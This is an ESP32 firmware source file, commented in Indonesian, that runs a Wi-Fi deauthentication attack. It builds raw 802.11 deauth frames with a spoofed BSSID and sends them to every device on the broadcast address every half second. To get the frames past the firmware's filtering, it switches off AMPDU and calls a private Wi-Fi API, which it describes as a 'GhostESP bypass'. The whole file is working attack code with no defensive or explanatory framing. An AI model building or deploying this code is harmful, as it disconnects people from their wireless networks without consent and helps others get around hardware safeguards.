#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_event.h"
#include "esp_private/wifi.h" // Jalur Tikus Private

static const char *TAG = "RootX_Fixed_v6";

// Fungsi Deauth murni gaya GhostESP
esp_err_t rootx_deauth_inject(uint8_t *bssid, uint8_t *target_mac) {
    uint8_t packet[26];
    
    packet[0] = 0xc0; packet[1] = 0x00; 
    packet[2] = 0x3a; packet[3] = 0x01;
    memcpy(&packet[4], target_mac, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    packet[22] = 0x00; packet[23] = 0x00; 
    packet[24] = 0x07; packet[25] = 0x00; 
    
    // Ini gak bakal error lagi karena AMPDU udah mati di init
    esp_wifi_internal_set_fix_rate(WIFI_IF_AP, true, WIFI_PHY_RATE_1M_L);
    
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void app_main(void) {
    // 1. Inisialisasi NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // 2. Inisialisasi Network Stack
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    // 3. MATIIN AMPDU SEBELUM WIFI INIT (KUNCI YANG GUE LUPA TADI)
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    cfg.ampdu_rx_enable = 0; // MATI!
    cfg.ampdu_tx_enable = 0; // MATI!
    
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGW(TAG, "GhostESP Bypass Technique Active. AMPDU Disabled.");

    uint8_t bssid[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x69, 0x69};
    uint8_t target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    while (1) {
        esp_err_t err = rootx_deauth_inject(bssid, target);
        
        if (err == ESP_OK) {
            ESP_LOGI(TAG, "Cok! BERHASIL INJECT 0xC0!");
        } else {
            ESP_LOGE(TAG, "Masih Gagal: 0x%x", err);
        }
        
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}
